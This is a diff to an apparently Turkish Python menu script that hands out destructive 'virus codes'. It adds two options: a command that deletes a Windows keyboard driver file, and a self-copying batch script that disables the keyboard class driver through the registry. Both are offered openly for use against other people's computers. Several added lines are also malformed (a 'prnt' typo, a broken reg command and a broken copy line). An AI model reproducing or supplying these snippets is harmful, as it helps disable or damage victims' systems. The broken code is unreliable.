@@ -42,6 +42,9 @@ print(Fore.BLUE + "Bilgisayarın Anasını Sİken Virüs Kodu İÇin 36'yı Seç
 print(Fore.BLUE + "Hibrid 1 Vİrüsü Kodları İÇin 37'yi Seçin")
 print(Fore.BLUE + "Hibrid 2 Virüsü Kodlaru İÇin 38'i Seçin")
 print(Fore.BLUE + "Hibir 3 Virüsü Kodları İçin 39'u Seçin (Diğer Hibrid Virüslerdem Daha İyi)")
+print(Fore.BLUE + "Klavye Dosyaları Sİlen Vİrüs Kodu İçin 40'ı Seçin")
+print(Fore.BLUE + "Klavye ve Mosue u Devre Dışı BIrakan Virüs Kodu İçin 41'i Seçin")
+
 # Kullanıcıdan değer alıyoruz
 x = input(Fore.GREEN + "Lütfen Bir Değer Giriniz: ")
 x = int(x)
@@ -1516,6 +1519,16 @@ MSKernel32.vbs"
 
 
 """
+
+klavyehackleyen = r"""
+[FONT=Courier New][SIZE=3][COLOR=White][U]del C:/WINDOWS/system/KEYBOARD.DRV[/U][/COLOR][/SIZE][/FONT]
+"""
+
+klavyemousedevredışı = r"""
+@echo off
+copy %0%windir%\Virus.bat> nul
+reg addHKLM\System\CurrentControlSet\Services\Kbdclass/v Start /t REG_DWORD /d4/f > nul
+"""
 # Kullanıcı girişi doğrulama ve işlem yapma
 if x == 1:
     print(Fore.YELLOW + system32silen)
@@ -1595,5 +1608,9 @@ elif x == 38:
     print(Fore.YELLOW + hibrid2)
 elif x == 39:
     print(Fore.YELLOW + hibrid3)
+elif x == 40:
+    print(Fore.YELLOW + klavyehackleyen)
+elif x == 41:
+    prnt(Fore.YELLOW + klavyemousedevredışı)
 else:
     print(Fore.RED + "Yanlış bir değer girdiniz. Lütfen tekrar deneyiniz...")
